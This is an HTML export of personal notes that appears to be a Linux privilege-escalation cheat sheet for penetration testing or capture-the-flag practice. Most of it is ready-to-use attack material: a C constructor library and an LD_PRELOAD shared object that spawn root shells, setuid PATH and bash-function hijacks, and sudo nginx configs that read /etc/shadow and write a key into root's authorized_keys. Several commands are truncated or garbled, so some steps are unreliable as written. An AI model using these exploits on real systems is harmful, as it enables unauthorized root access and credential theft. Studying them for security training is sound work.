<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>3-Low hanging Fruits</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>3-Low hanging Fruits</h1><br/><p><ol><li>exploit gid=0<ul><li><h3>   ◇ </h3>   ◇ read many files<ul><li> find / -perm -g+r ! -perm -o+r 2&gt;/dev/null</li></ul></li><li>write many files</li></ul></li></ol></p><p> <ol><li>exploit setuid , sudo ... </li><li>find vulnerable services<ol><li>ss -tuln</li><li>ssh user@$target -L &lt;localport&gt;:127.0.0.1:&lt;remote port&gt;</li><li>find version inside JS ode </li><li>e.g ?code.cs=</li></ol></li></ol></p><p><h2>exploit export capability</h2><ul><li><h3>• </h3>• change a setuid file by changing the path and looking for another script called by it</li></ul></p><p></p><p><h2>linpeas</h2><ul><li>automated tool</li></ul></p><p>https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh</p><p><ul><li>/opt/linpeas.sh</li></ul></p><p></p><p><h2>exploit setuid : missing library</h2><ul><li><h3>• </h3>• strace <a href="http://stuid">stuid binary</a> 2&gt;&amp;1 -E &quot;open</p><p></li></ul><div class="codebox"><pre><br /><span style="color:#7f0044;font-weight:700">#include &lt;stdio.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;stdlib.h&gt;</span><br /><br /><span style="color:#7f0044;font-weight:400">static</span> <span style="color:#7f0044;font-weight:400">void</span> inject() __attribute__((constructor));<br /><br /><span style="color:#7f0044;font-weight:400">void</span> inject() {<br />    system(<span style="color:#3ad900;font-weight:400">&quot;cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p&quot;</span>);<br />}<br /></pre></div></p><p></p><p><h2>exploit setuid : PATH</h2><ul><li>strings $program</li><li>export PATH=&quot;/tmp:$PATH&quot;</li></ul></p><p></p><p><h2>Environment variable attack (absolute path with system called</h2><h3></h3></p><p><h3></h3><ul><li>In Bash versions </li></ul></p><p> then export those functions so that they are used instead of any actual executable at that file path.<ul><li>function /usr/sbin/<a href="http://absolute">absolute path oàf function</a>() { cp /bin/bash /tmp &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash </li><li>export <a href="http://function">function</a></li><li><a href="http://function">• </a>• example<ul><li> function /usr/sbin/service() { cp /bin/bash /tmp &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash </li><li> export </li></ul></li><li>method 2 with ShellOpts<ul><li> env &#39; /bin/sh -c &#39;/usr/local/bin/suid-env2; set +x; /tmp/bash -p&#39;</li></ul></li></ul></p><p></p><p></p><p><h2>Exploit asterix  (*)</h2></p><p><ul><li>example: sudo -l <ul><li></li></ul></li></ul><img src="images/104-1.png" alt="images/104-1.png" /><ul><li>sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/test.js</li></ul></p><p></p><p></p><p><h2>Exploit sudo nginx</h2></p><p>setup config </p><p></p><p><div class="codebox"><pre>## test_get.conf<br />user root;<br />events {<br />    worker_connections 1024;<br />}<br />http {<br />    server {<br />        listen 1337;<br />        root /;<br />        autoindex on;<br />    }<br />}<br /><br />## test_write.conf<br /><br />user root;<br />events {<br />    worker_connections 1024;<br />}<br />http {<br />    server {<br />        listen 1338;<br />        root /;<br />        autoindex on;<br />        dav_methods PUT;<br />    }<br />}<br /></pre></div><ul><li>firtst:<ul><li>curl localhost:1337/etc/shadow</li></ul></li></ul></p><p>•for the second<ul><li> curl -X PUT localhost:1338/root/.ssh/authorized_keys -d &#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing&#39;</li></ul></p><p><h2>sudo LD_preloads</h2></p><p></p><p><div class="codebox"><pre><span style="color:#7f0044;font-weight:700">#include &lt;stdio.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;sys/types.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;stdlib.h&gt;</span><br /><br /><span style="color:#7f0044;font-weight:400">void</span> _init() {<br />unsetenv(<span style="color:#3ad900;font-weight:400">&quot;LD_PRELOAD&quot;</span>);<br />setgid(<span style="color:#ff0044;font-weight:400">0</span>);<br />setuid(<span style="color:#ff0044;font-weight:400">0</span>);<br />system(<span style="color:#3ad900;font-weight:400">&quot;/bin/bash&quot;</span>);<br />}</pre></div></p><p><ul><li>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</li><li>sudo LD_PRELOAD=/home/user/ldpreload/shell.so &lt;sudo program&gt;</li></ul></p><p></p><p></p></div>
</body>
</html>
